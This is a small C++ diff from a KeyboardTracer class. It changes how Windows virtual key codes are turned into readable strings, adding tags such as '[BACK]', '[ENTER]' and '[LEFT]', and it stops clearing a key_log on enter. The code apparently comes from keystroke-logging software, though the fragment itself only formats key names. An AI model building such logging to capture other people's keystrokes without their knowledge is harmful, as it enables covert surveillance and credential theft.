@@ -44,28 +44,28 @@ std::string KeyboardTracer::transVirtualKey(WPARAM virkey)
     switch (virkey)
     {
     case 0x08:
-        ret += "B";
+        ret += "[BACK]";
         break;
     case 0x0d://enter
-        key_log.clear();
+        ret += "[ENTER]";
         break;
     case 0x20:
         ret += " ";
         break;
     case 0x25:// left
-        ret += "L";
+        ret += "[LEFT]";
         break;
     case 0x26:
-        ret += "U";
+        ret += "[UP]";
         break;
     case 0x27:
-        ret += "R";
+        ret += "[RIGHT]";
         break;
     case 0x28:
-        ret += "D";
+        ret += "[DOWN]";
         break;
     case 0x2e://clear
-        ret += "C";
+        ret += "[CLEAR]";
         break;
     case 0x30:
         ret += "0";
